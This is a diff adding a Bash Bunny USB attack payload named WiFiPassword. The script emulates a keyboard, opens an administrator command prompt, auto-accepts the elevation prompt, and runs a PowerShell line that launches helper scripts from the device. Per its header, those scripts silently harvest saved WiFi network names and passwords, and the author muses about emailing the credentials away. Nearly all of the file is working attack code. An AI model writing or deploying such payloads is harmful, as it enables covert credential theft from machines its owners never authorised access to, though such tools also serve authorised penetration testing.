@@ -1,0 +1,30 @@
+#!/bin/bash
+#
+# Title:         WiFiPassword
+# Author:        T
+# Version:       1.0
+# Target:        Windows XP SP3+
+# Props:         Siem's WiFi password grabber duck script,@hak5darren for a a bunch of stuff,@BHinfoSecurity for making me realize I could pass the netsh commands into eachother like they do with net.exe to find domain passwords which also would probably totally work here if you could get the email script into the e.cmd file then walk away and wait for it to email you the user names and passwords
+# 
+# Executes d.cmd from the selected switch folder of the Bash Bunny USB Disk partition,
+# which in turn executes e.cmd invisibly using i.vbs
+# which in turn harvests the SSID and key content (password) for WiFi profiles.
+#
+
+# Source bunny_helpers.sh to get environment variable SWITCH_POSITION
+source bunny_helpers.sh
+
+LED R
+ATTACKMODE HID STORAGE
+REM open cmd as admin
+QUACK CONTROL ESCAPE
+QUACK DELAY 100
+QUACK STRING cmd.exe
+QUACK CTRL-SHIFT ENTER
+QUACK DELAY 1000
+QUACK ALT y
+QUACK ENTER
+QUACK DELAY 50
+QUACK STRING powershell ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\d.cmd')"
+QUACK ENTER
+LED G
